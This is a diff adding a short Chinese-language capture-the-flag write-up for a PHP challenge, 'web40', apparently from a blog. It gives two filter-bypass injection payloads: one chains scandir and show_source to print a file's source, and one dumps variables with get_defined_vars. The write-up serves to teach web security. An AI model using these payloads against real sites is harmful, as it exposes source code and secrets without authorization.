@@ -937,7 +937,26 @@ data://text/plain,<?php 代码;?>  #data协议的作用是把后面的字符串�
 
 ## web40
 
+还是过滤 。。。。。。。。
 
+![image-20230528112917574](https://cdn.jsdelivr.net/gh/rainsbluechan/blogimage@main/img/image-20230528112917574.png)
+
+这是不是把改ban的符号全ban了....汗，问号也不能用？有提示解法。
+
+```
+show_source(next(array_reverse(scandir(pos(localeconv())))));
+通过货币信息扫这个pos，然后把目录进行翻转，然后取下一个next，再显示源码。
+```
+
+![image-20230528113446324](https://cdn.jsdelivr.net/gh/rainsbluechan/blogimage@main/img/image-20230528113446324.png)
+
+还有一种方法，是获取当前所有的变量。
+
+```
+?变量=print_r(get_defined_vars());
+```
+
+![image-20230528114332835](https://cdn.jsdelivr.net/gh/rainsbluechan/blogimage@main/img/image-20230528114332835.png)
 
 ## 方便下一个博客的链接点
 
